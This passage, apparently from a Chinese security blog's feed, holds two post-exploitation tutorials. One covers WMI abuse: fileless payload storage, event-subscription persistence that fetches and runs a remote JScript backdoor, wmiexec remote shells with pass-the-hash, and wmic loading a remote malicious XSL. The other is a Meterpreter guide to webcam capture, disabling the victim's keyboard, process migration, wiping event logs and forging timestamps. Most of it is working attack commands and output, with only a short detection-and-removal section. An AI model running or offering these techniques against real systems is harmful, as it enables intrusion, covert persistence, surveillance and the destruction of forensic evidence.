<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_18.png" alt="wmic_18"></p>
<p><strong>Tips：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可加密存储于此位置，执行时解密运行，达到硬盘不存文件的效果</span><br></pre></td></tr></table></figure>
<h4><span id="隐蔽定时启动程序">隐蔽定时启动程序</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;BotFilter82&apos;</span><br><span class="line">$consumerName = &apos;BotConsumer23&apos;</span><br><span class="line">$exePath = &apos;C:\Windows\System32\notepad.exe&apos;</span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE</span><br><span class="line">TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=</span><br><span class="line">$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop</span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath&#125;</span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=</span><br><span class="line">$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_19.png" alt="wmic_19"></p>
<p>查看进程：</p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1553239184506.png" alt="1553239184506"></p>
<p>每60s执行一次notepad.exe</p>
<h4><span id="远程下载js脚本">远程下载js脚本</span></h4><p>通过远程下载js脚本，进行命令调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!powershell</span><br><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_22.png" alt="wmic_22"></p>
<h3><span id="wmi后门检测及清除">WMI后门检测及清除</span></h3><h4><span id="查看当前wmi-event">查看当前WMI Event</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#List Event Filters</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line"></span><br><span class="line">#List Event Consumers</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line">#List Event Bindings</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_21.png" alt="wmic_21"></p>
<h4><span id="清除后门">清除后门</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Filter</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&apos;BotFilter82&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Consumer</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&apos;BotConsumer23&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Binding</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &apos;%</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_19.png" alt="wmic_19"></p>
<h3><span id="wmiexecvbs">wmiexec.vbs</span></h3><p>WMIEXEC是用VBS脚本调用WMI来模拟psexec的功能</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_23.png" alt="wmic_23"></p>
<p>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。<br>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
<h4><span id="半交互shell模式">半交互shell模式</span></h4><p>提供账号密码，执行如下命令： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_24.png" alt="wmic_24"></p>
<p>这样就获得了一个半交互式的shell，这个shell和psexec的shell没什么区别。之所以称为半交互式，是因为这个shell也不能执行实时交互的命令，和psexec是一样的。</p>
<p>如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>
<p>利用wce抓取hash:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -l</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_25.png" alt="wmic_25"></p>
<p>利用wce进行hash注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -s Administrator:WIN-2003:F67CE55AC831223DC187B8085FE1D9DF:45A524862326CB9E7D85AF4017A000F0</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_26.png" alt="wmic_26"></p>
<h4><span id="单个命令执行的模式">单个命令执行的模式</span></h4><p>这个模式适用于只需要执行一个命令，或者说当前的环境不是交互式shell，没法运行WMIEXEC的shell模式时（比如在webshell里面)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_27.png" alt="wmic_27"></p>
<h3><span id="wmic调用xsl文件">wmic调用xsl文件</span></h3><p>本地：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list /FORMAT:evil.xsl</span><br></pre></td></tr></table></figure>
<p>远程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:&quot;https://example.com/evil.xsl&quot;</span><br></pre></td></tr></table></figure>
<p>xsl文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method=&quot;text&quot;/&gt;</span><br><span class="line">    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">    ]]&gt; &lt;/ms:script&gt;</span><br><span class="line">&lt;/stylesheet&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl&quot;</span><br></pre></td></tr></table></figure>
<p>执行成功，成功弹出计算器，如下图</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_28.png" alt="wmic_28"></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[后渗透之meterpreter使用攻略]]></title>
      <url>https://uknowsec.cn/posts/uncategorized/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8Bmeterpreter%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="系统命令">系统命令</span></h2><h3><span id="基本系统命令">基本系统命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限 </span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2852</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-7</span><br><span class="line">OS              : Windows 7 (Build 7600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : UKNOWSEC</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                     Arch  Session  User        Path</span><br><span class="line"> ---   ----  ----                     ----  -------  ----        ----</span><br><span class="line"> 0     0     [System Process]                                    </span><br><span class="line"> 4     0     System                                              </span><br><span class="line"> 248   500   svchost.exe                                         </span><br><span class="line"> 268   4     smss.exe                                            </span><br><span class="line"> 356   348   csrss.exe                                           </span><br><span class="line"> 396   348   wininit.exe                                         </span><br><span class="line"> 404   388   csrss.exe                                           </span><br><span class="line"> 440   388   winlogon.exe                                        </span><br><span class="line"> 500   396   services.exe                                        </span><br><span class="line"> 508   396   lsass.exe                                           </span><br><span class="line"> 516   396   lsm.exe                                             </span><br><span class="line"> 628   500   svchost.exe                                         </span><br><span class="line"> 648   500   svchost.exe                                         </span><br><span class="line"> 688   500   vmacthlp.exe                                        </span><br><span class="line"> 732   500   svchost.exe                                         </span><br><span class="line"> 772   500   svchost.exe                                         </span><br><span class="line"> 832   500   TrustedInstaller.exe                                </span><br><span class="line"> 860   500   svchost.exe                                         </span><br><span class="line"> 900   500   svchost.exe                                         </span><br><span class="line"> 1084  500   spoolsv.exe                                         </span><br><span class="line"> 1112  500   svchost.exe                                         </span><br><span class="line"> 1260  500   svchost.exe                                         </span><br><span class="line"> 1272  500   sppsvc.exe                                          </span><br><span class="line"> 1356  500   VGAuthService.exe                                   </span><br><span class="line"> 1396  628   WmiPrvSE.exe                                        </span><br><span class="line"> 1548  500   vmtoolsd.exe                                        </span><br><span class="line"> 1764  500   ManagementAgentHost.exe                             </span><br><span class="line"> 1780  500   wmpnetwk.exe                                        </span><br><span class="line"> 1908  500   svchost.exe                                         </span><br><span class="line"> 2036  500   msdtc.exe                                           </span><br><span class="line"> 2348  404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe</span><br><span class="line"> 2356  2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe</span><br><span class="line"> 2532  500   svchost.exe                                         </span><br><span class="line"> 2684  500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2736  860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe</span><br><span class="line"> 2752  2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe</span><br><span class="line"> 2852  3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe</span><br><span class="line"> 2876  2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 3048  500   SearchIndexer.exe                                   </span><br><span class="line"> 3816  900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe</span><br><span class="line"> 3824  500   svchost.exe                                         </span><br><span class="line"></span><br><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle for: 14 mins 20 secs</span><br></pre></td></tr></table></figure>
<h3><span id="uictl开关键盘鼠标">uictl开关键盘/鼠标</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; uictl disable mouse</span><br><span class="line">Disabling mouse...</span><br><span class="line">meterpreter &gt; uictl disable keyboard</span><br><span class="line">Disabling keyboard...</span><br><span class="line">meterpreter &gt; uictl enable mouse</span><br><span class="line">Enabling mouse...</span><br><span class="line">meterpreter &gt; uictl enable keyboard</span><br><span class="line">Enabling keyboard...</span><br></pre></td></tr></table></figure>
<h3><span id="webcam摄像头命令">webcam摄像头命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  #查看摄像头</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br></pre></td></tr></table></figure>
<h3><span id="execute执行文件">execute执行文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -i -f cmd.exe</span><br><span class="line">Process 3616 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\Win7\Desktop&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="migrate进程迁移">migrate进程迁移</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2852</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                     Arch  Session  User        Path</span><br><span class="line"> ---   ----  ----                     ----  -------  ----        ----</span><br><span class="line"> 0     0     [System Process]                                    </span><br><span class="line"> 4     0     System                                              </span><br><span class="line"> 248   500   svchost.exe                                         </span><br><span class="line"> 268   4     smss.exe                                            </span><br><span class="line"> 356   348   csrss.exe                                           </span><br><span class="line"> 396   348   wininit.exe                                         </span><br><span class="line"> 404   388   csrss.exe                                           </span><br><span class="line"> 440   388   winlogon.exe                                        </span><br><span class="line"> 500   396   services.exe                                        </span><br><span class="line"> 508   396   lsass.exe                                           </span><br><span class="line"> 516   396   lsm.exe                                             </span><br><span class="line"> 628   500   svchost.exe                                         </span><br><span class="line"> 648   500   svchost.exe                                         </span><br><span class="line"> 688   500   vmacthlp.exe                                        </span><br><span class="line"> 732   500   svchost.exe                                         </span><br><span class="line"> 772   500   svchost.exe                                         </span><br><span class="line"> 832   500   TrustedInstaller.exe                                </span><br><span class="line"> 860   500   svchost.exe                                         </span><br><span class="line"> 900   500   svchost.exe                                         </span><br><span class="line"> 1084  500   spoolsv.exe                                         </span><br><span class="line"> 1112  500   svchost.exe                                         </span><br><span class="line"> 1260  500   svchost.exe                                         </span><br><span class="line"> 1272  500   sppsvc.exe                                          </span><br><span class="line"> 1356  500   VGAuthService.exe                                   </span><br><span class="line"> 1396  628   WmiPrvSE.exe                                        </span><br><span class="line"> 1548  500   vmtoolsd.exe                                        </span><br><span class="line"> 1764  500   ManagementAgentHost.exe                             </span><br><span class="line"> 1780  500   wmpnetwk.exe                                        </span><br><span class="line"> 1908  500   svchost.exe                                         </span><br><span class="line"> 2036  500   msdtc.exe                                           </span><br><span class="line"> 2348  404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe</span><br><span class="line"> 2356  2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe</span><br><span class="line"> 2504  2752  calc.exe                 x64   1        WIN-7\Win7  C:\Windows\System32\calc.exe</span><br><span class="line"> 2532  500   svchost.exe                                         </span><br><span class="line"> 2684  500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2736  860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe</span><br><span class="line"> 2752  2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe</span><br><span class="line"> 2852  3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe</span><br><span class="line"> 2876  2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 3048  500   SearchIndexer.exe                                   </span><br><span class="line"> 3316  772   audiodg.exe              x64   0                    </span><br><span class="line"> 3816  900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe</span><br><span class="line"> 3824  500   svchost.exe                                         </span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 2876</span><br><span class="line">[*] Migrating from 3504 to 2876...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>
<h3><span id="clearev清除日志">clearev清除日志</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 365 records from Application...</span><br><span class="line">[*] Wiping 1222 records from System...</span><br><span class="line">[*] Wiping 404 records from Security...</span><br></pre></td></tr></table></figure>
<h2><span id="文件系统命令">文件系统命令</span></h2><h3><span id="基本文件系统命令">基本文件系统命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者pwd # 查看当前工作目录  </span><br><span class="line">ls</span><br><span class="line">cd</span><br><span class="line">search -f *pass*       # 搜索文件  -h查看帮助</span><br><span class="line">cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上</span><br><span class="line">edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件</span><br><span class="line">rm C:\\lltest\\hack.txt</span><br><span class="line">mkdir lltest2  #只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  #只能删除当前目录下文件夹</span><br><span class="line">getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</span><br><span class="line">lcd /tmp   #操作攻击者主机 切换目录</span><br></pre></td></tr></table></figure>
<h3><span id="timestomp伪造时间戳">timestomp伪造时间戳</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; timestomp -v C://2.txt</span><br><span class="line">[*] Showing MACE attributes for C://2.txt</span><br><span class="line">Modified      : 2018-12-18 00:48:02 -0500</span><br><span class="line">Accessed      : 2018-12-18 00:48:02 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-18 00:48:10 -0500</span><br><span class="line">meterpreter &gt; timestomp -v C://1.txt</span><br><span class="line">[*] Showing MACE attributes for C://1.txt</span><br><span class="line">Modified      : 2018-12-17 22:52:44 -0500</span><br><span class="line">Accessed      : 2018-12-17 22:52:59 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-17 22:52:59 -0500</span><br><span class="line">meterpreter &gt; timestomp C://2.txt -f C://1.txt</span><br><span class="line">[*] Pulling MACE attributes from C://1.txt</span><br><span class="line">[*] Setting specific MACE attributes on C://2.txt</span><br><span class="line">meterpreter &gt; timestomp -v C://2.txt</span><br><span class="line">[*] Showing MACE attributes for C://2.txt</span><br><span class="line">Modified      : 2018-12-17 22:52:44 -0500</span><br><span class="line">Accessed      : 2018-12-17 22:52:59 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-17 22:52:59 -0500</span><br></pre></td></tr></table></figure>
